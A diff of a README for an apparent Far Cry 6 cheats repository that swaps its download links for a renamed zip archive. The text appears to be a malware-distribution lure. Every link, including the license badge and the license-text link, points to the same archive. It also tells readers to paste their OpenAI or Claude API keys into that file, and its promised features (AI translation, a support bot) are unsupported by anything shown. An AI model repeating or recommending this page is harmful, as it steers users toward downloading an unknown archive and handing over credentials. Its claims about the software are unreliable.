@@ -1,6 +1,6 @@
 # Far Cry 6 Cheats Master Collection
 
-[![Download](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)
 
 Welcome to the **Far Cry 6 Cheats Master Collection**: your sophisticated toolkit for elevating gameplay, boosting creativity, and personalizing your experience in the vibrant world of Far Cry 6. This repository is crafted for those who dream in Cuban neon, chase digital sunsets, and believe the greatest adventures begin with a well-tuned shortcut.
 
@@ -59,7 +59,7 @@ By using state-of-the-art integration and modularity, this toolkit is your gatew
 - 💬 **Live Language Translation:** Enjoy dialogues and menus in your language of choice, locally powered by next-gen translation models.
 - 🤝 **Intelligent Support Bot:** Get personalized help or cheat recommendations 24/7 through an integrated chat assistant.
 
-> *To set up AI features, obtain your personal OpenAI or Claude API key and follow the instructions in the `https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip` file.*
+> *To set up AI features, obtain your personal OpenAI or Claude API key and follow the instructions in the `https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip` file.*
 
 ---
 
@@ -85,9 +85,9 @@ Embark on a seamless journey!
 
 ### 1. Download the Collection
 
-[![Download](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)
 
-or manually fetch the **Latest Release** from this https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip
+or manually fetch the **Latest Release** from this https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip
 
 ### 2. Extract & Install
 
@@ -97,7 +97,7 @@ or manually fetch the **Latest Release** from this https://raw.githubusercontent
 
 ### 3. AI Integration (Optional)
 
-- Open `https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip` and paste your API keys for OpenAI or Claude.
+- Open `https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip` and paste your API keys for OpenAI or Claude.
 - Enable “AI Features” in the Master Settings panel.
 
 ### 4. Launch & Play
@@ -119,16 +119,16 @@ The Far Cry 6 Cheats Master Collection is provided for educational purposes, cre
 
 Built on open-source ideals for adaptability and discovery.
 
-[![MIT License](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)
+[![MIT License](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)
 
 Copyright (c) 2025
 
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the following conditions:
 
-[Read the full license text →](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)
+[Read the full license text →](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-cry-6-enhanced-gameplay-tweaks-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)](https://raw.githubusercontent.com/BabyDriver254/far-cry-6-enhanced-gameplay-tweaks/branch/catenulate/far-enhanced-cry-tweaks-gameplay-v1.4.zip)
 
 Unlock new horizons. Shape your adventure. Viva la revolución!
